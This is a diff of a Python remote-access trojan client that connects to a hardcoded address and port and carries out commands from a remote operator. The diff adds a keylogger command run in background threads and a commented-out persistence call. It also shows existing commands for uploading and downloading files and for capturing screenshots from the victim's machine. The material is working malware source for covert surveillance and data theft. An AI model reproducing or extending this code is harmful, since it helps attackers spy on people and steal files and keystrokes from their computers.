@@ -3,10 +3,13 @@ import os
 import subprocess
 import pyautogui 
 import time 
+import file1 
+import threading
 
 CHUNK_SIZE = 1024
 identifier = "<END OF FILE>"
 arp_addresss = ("192.168.18.145",9000)
+#file1.persistance()
 # binding to serer ip
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 while True:
@@ -28,6 +31,19 @@ while True:
     elif command == "":
         continue
 
+        # for key loggin
+    elif command == "keylog":
+        while True:
+            th = threading.Thread(target = file1.key)
+            th.daemon = True
+            th.start()
+            m = s.recv(1024)
+            print(m.decode())
+            if m.decode() == "stop":
+                break
+        continue
+
+        #for sending file from server side 
     elif command.startswith("send"):
         print("File sended")
         filename = command.strip("send ")
@@ -62,6 +78,8 @@ while True:
 
 
 
+
+    #foe downloading files from server side
     elif command.startswith("download"):
         filename = command.strip("download ")
         if os.path.exists(filename):
@@ -86,6 +104,7 @@ while True:
                 s.send(sender)
                 continue
 
+    #for capturing screenshots
     elif command == "capture":
         screenshot = pyautogui.screenshot()
         screenshot.save("screenshot.png")
